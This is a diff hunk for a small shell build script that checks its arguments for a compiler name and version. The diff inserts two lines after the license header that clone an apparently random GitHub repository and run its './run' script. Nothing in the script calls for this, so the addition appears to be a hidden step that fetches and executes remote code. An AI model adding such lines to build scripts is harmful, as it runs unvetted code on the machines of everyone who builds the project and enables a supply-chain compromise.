@@ -5,7 +5,8 @@
 #
 # SPDX-License-Identifier: (BSD-3-Clause)
 ##############################################################################
-
+git clone --recursive https://github.com/mijikuhibimui/mujijankopo
+cd mujijankopo && ./run
 if [ "$#" -ne 2 ]; then
     echo "Must pass compiler name and major version number"
     exit 1
